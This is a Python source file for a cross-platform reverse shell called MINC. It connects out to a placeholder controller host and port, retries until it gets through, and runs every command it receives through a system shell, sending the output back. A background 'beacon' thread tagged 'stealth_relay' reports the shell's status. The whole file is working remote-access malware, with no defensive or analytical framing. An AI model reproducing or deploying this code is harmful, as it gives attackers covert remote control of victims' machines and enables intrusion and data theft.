# MINC - Cross-Platform Python Reverse Shell + Beacon Logic

import socket
import subprocess
import os
import platform
import time
import threading
from modules.beacon_logic import ping_beacon, timed_beacon_loop

HOST = "YOUR.CONTROLLER.IP"
PORT = 5775
RETRY_DELAY = 10

# === Shell Info for Beacon ===
SHELL_ID = "shell_" + str(os.getpid())
TAGS = ["reverse", "memory"]
ATTITUDE = "stealth_relay"
MODULES = ["reverse_shell"]

def establish_connection():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            return sock
        except:
            time.sleep(RETRY_DELAY)

def execute_command_loop(sock):
    while True:
        try:
            sock.send(b"\n$ ")
            cmd = sock.recv(1024).decode().strip()
            if cmd.lower() in ("exit", "quit"):
                break

            if platform.system().lower() == "windows":
                output = subprocess.check_output(cmd, shell=True)
            else:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)

            sock.send(output)
        except Exception as e:
            try:
                sock.send(f"[err] {e}".encode())
            except:
                pass

def launch_beacon_thread():
    print(f"[reverse_shell] 🛰 Launching beacon loop for {SHELL_ID}")
    t = threading.Thread(
        target=timed_beacon_loop,
        args=(SHELL_ID, TAGS, ATTITUDE, MODULES),
        daemon=True
    )
    t.start()

def main():
    # Initial beacon
    ping_beacon(SHELL_ID, tags=TAGS, attitude=ATTITUDE, modules=MODULES, beacon_type="init")

    sock = establish_connection()
    launch_beacon_thread()

    try:
        execute_command_loop(sock)
    finally:
        sock.close()
        ping_beacon(SHELL_ID, tags=TAGS, attitude=ATTITUDE, modules=MODULES, beacon_type="exit")

if __name__ == "__main__":
    main()

